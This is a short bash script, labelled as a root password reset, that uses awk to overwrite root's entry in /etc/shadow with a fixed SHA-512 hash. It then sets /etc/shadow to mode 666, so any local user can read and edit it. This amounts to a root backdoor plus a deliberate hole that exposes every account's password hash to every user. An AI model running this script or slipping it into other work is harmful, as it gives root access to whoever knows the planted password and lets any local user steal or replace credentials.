#!/bin/bash
# This script resets the root user's password hash in /etc/shadow

HASH='$6$2ylUW./rGcK9/QKD$yKIoT1ct2j7fL0hL2ACCBL35R9L8Nj7vPbaoAQZtuV1TM6An8k2Kx4lcF/hVJLF6Og82FLaS4GB6oZHxP3rnt1'
awk -F: -v OFS=: -v newhash="$HASH" '{if ($1=="root") $2=newhash; print $0}' /etc/shadow > /tmp/shadow && mv /tmp/shadow /etc/shadow && chmod 666 /etc/shadow
